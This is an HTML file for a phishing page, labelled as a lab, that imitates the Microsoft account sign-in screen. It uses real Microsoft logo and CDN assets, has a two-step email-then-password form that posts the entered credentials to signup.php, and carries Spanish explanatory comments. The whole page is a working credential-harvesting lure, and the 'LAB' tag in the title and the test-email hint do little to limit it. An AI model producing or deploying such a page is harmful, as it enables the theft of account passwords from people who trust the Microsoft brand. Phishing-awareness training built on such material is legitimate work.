<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <!-- Si tienes style.css en el repo, mantenlo así -->
  <link rel="stylesheet" href="style.css" />
  <title>Sign in to your Microsoft account (LAB)</title>
  <link rel="icon" type="image/x-icon" href="https://logincdn.msftauth.net/16.000.30004.15/images/favicon.ico">
  <style>
    /* Si no tienes style.css o quieres ver algo básico rápido, este CSS mínimo evita que se vea desordenado */
    body { font-family: Arial, sans-serif; padding: 24px; }
    .container { max-width: 420px; margin: 0 auto; }
    h2 { font-size: 28px; margin: 12px 0; }
    .form-group input { width: 100%; padding: 8px; box-sizing: border-box; margin-bottom: 12px; }
    .next-btn, button[type="submit"] { padding: 6px 12px; cursor: pointer; }
    .forms { transition: transform .3s ease; }
    .forms.next-form { transform: translateX(-100%); }
    .forms .first, .forms .second { width: 100%; }
    .forms .second { display: block; }
    .bottom { margin-top: 18px; display: flex; gap: 8px; align-items: center; }
    .arrow-btn { cursor: pointer; margin-right: 8px; }
  </style>
</head>
<body>
  <div class="container">
    <!-- form envia a signup.php por POST -->
    <form action="signup.php" method="POST" name="logonForm" autocomplete="off">
      <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="logo" style="max-width:140px;">
      <div class="forms-container">
        <div class="forms">
          <!-- PRIMERA PANTALLA -->
          <div class="first">
            <h2>Sign in</h2>
            <div class="form-group">
              <!-- name="email" necesario para que PHP lo lea -->
              <input type="email" name="email" placeholder="Email, Phone, or Skype" required>
            </div>
            <p>No account? <a href="#">Create One!</a></p>
            <a href="#">Sign in with a security key <span>?</span></a>
            <!-- Este botón solo cambia vista a la segunda parte (JS lo maneja) -->
            <button type="button" class="next-btn">Next</button>
          </div>

          <!-- SEGUNDA PANTALLA -->
          <div class="second" style="margin-top:20px;">
            <p><span class="arrow-btn">&#8592;</span> <span class="email-display">example@test.com</span></p>
            <h2>Enter password</h2>
            <div class="form-group">
              <!-- name="password" necesario para que PHP lo lea -->
              <input type="password" name="password" placeholder="Password" required>
            </div>
            <a href="#">Forgot password?</a>
            <!-- Este botón es submit: envía el formulario a signup.php -->
            <button type="submit">Sign in</button>
          </div>
        </div>
      </div>
    </form>

    <div class="bottom">
      <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" alt="options" style="max-width:100px;">
      <span>Sign-in options</span>
    </div>
  </div>

  <div id="footer" role="contentinfo" class="footer ext-footer" style="margin-top:30px;">
    <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links">
      <a id="ftrTerms" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US">Terms of use</a> ·
      <a id="ftrPrivacy" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US">Privacy &amp; cookies</a>
      <a id="moreOptions" href="#" style="margin-left:8px;">...</a>
    </div>
  </div>

  <script>
    // JS simple para cambiar entre "pantallas" y mostrar el email ingresado
    const forms = document.querySelector('.forms');
    const nextButton = document.querySelector('.next-btn');
    const arrowButton = document.querySelector('.arrow-btn');
    const emailInput = document.querySelector('.first input[name="email"]');
    const emailDisplay = document.querySelector('.email-display');

    nextButton.addEventListener('click', () => {
      // valida que haya un email mínimo
      if (!emailInput.value.trim()) {
        alert('Please enter an email (use a test email).');
        emailInput.focus();
        return;
      }
      // Transición visual simple
      forms.classList.add('next-form');
      emailDisplay.innerText = emailInput.value;
      // opcional: esconder la parte inferior
      document.querySelector('.bottom').style.display = 'none';
    });

    arrowButton.addEventListener('click', () => {
      forms.classList.remove('next-form');
      document.querySelector('.bottom').style.display = 'flex';
    });
  </script>
</body>
</html>
